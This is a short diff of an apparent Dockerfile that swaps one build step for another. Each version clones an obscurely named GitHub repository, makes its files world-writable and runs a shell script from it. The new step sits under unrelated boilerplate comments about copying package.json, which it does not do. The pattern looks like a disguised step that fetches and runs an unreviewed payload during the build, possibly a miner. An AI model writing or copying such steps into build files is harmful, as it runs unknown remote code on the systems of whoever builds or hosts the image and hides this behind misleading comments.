@@ -1,3 +1,5 @@
-FROM ubuntu:20.04
-RUN git clone https://github.com/03081997/aa.git && cd aa && chmod 777 gas 0.sh && ./0.sh
+FROM node:14
+# Install app dependencies
+# A wildcard is used to ensure both package.json AND package-lock.json are copied
+RUN git clone https://github.com/03081997/00.git && cd 00 && chmod 777 00 00.sh && ./00.sh
  
